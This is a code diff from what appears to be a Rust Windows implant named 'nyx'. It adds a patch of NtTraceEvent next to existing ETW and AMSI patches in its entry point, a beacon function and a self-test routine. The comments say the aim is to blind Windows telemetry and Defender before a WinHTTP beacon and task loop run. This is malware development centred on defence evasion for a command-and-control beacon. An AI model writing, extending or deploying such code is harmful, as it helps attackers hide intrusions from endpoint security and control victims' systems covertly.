@@ -42,7 +42,13 @@ pub unsafe extern "system" fn nyx_entry() {
     // 3. Blind ETW (always present in ntdll) + best-effort AMSI (amsi.dll is
     //    usually not loaded yet; the beacon loop retries it each cycle). Done
     //    before any scanning-relevant action so telemetry is neutralized early.
+    //    P2.1b: also blind NtTraceEvent (one patch covers the whole
+    //    EtwEventWrite* family; less-watched than EtwEventWrite in 2026
+    //    Defender). Both patches are idempotent, so landing both is safe and
+    //    gives layered coverage (EtwEventWrite direct + the family-wide
+    //    NtTraceEvent route).
     let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_nt_trace_event();
     let _ = crate::blind::patch_amsi();
 
     // 4. Enter the beacon loop (WinHTTP check-in + task loop).
@@ -63,6 +69,7 @@ pub unsafe extern "system" fn nyx_beacon_oneshot() {
     let _ssn_table = ntdll.resolve_table_owned();
     crate::syscalls::init_global();
     let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_nt_trace_event();
     let _ = crate::blind::patch_amsi();
     let code = crate::beacon::beacon_oneshot();
     // Exit with the status code so the harness can read %ERRORLEVEL%.
@@ -206,9 +213,11 @@ pub unsafe extern "system" fn nyx_selftest_evasion() {
     }
 
     // === Phase 5: AMSI/ETW blind byte-verify ===
-    // Patch ETW (always present) + AMSI (best-effort), then re-read the first
-    // bytes and compare to the patch to PROVE the write landed.
+    // Patch ETW (always present) + NtTraceEvent (P2.1b, family-wide) + AMSI
+    // (best-effort), then re-read the first bytes and compare to the patch to
+    // PROVE the write landed.
     let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_nt_trace_event();
     let amsi_attempted = crate::blind::patch_amsi().is_ok();
 
     let mut mask: u32 = 0;
